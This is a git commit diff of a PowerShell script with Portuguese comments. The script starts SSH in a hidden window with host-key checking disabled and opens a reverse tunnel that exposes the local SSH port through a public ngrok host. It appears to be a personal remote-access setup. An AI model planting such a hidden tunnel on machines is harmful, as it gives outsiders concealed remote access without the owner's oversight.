35ae9e169411c75860bb3e336e3abbedc901a907
usermants <sanchezguy@proton.me>
2025-09-09 01:43:07 -0300

    Update ssh.ps1

--- ssh.ps1
+++ ssh.ps1
@@ -4,19 +4,13 @@ $sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
 # Caminho da chave privada
 $keyPath = "C:\Users\Testes\.ssh\ssh_key"
 
-# Caminho do log (único arquivo com stdout + stderr)
+# Caminho do log
 $logFile = "C:\Users\Testes\.ssh\ssh_verbose_log.txt"
 
-# Monta os argumentos exatamente como no terminal
-$arguments = @"
--i `"$keyPath`" `
--o StrictHostKeyChecking=no `
--o ServerAliveInterval=60 `
--o ServerAliveCountMax=3 `
--o ExitOnForwardFailure=yes `
--R 2222:localhost:22 `
-u0_a416@0.tcp.sa.ngrok.io -p 18149 -N -vvv *>> `"$logFile`"
-"@
+# Monta o comando exatamente como no terminal
+$command = "& `"$sshPath`" -i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 u0_a416@0.tcp.sa.ngrok.io -p 18149 -N -vvv *> `"$logFile`""
 
-# Executa SSH em segundo plano invisível com redirecionamento para log
-Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden
+# Executa invisível pelo PowerShell, que entende o operador *>
+Start-Process -FilePath "powershell.exe" `
+    -ArgumentList "-NoProfile -Command $command" `
+    -WindowStyle Hidden
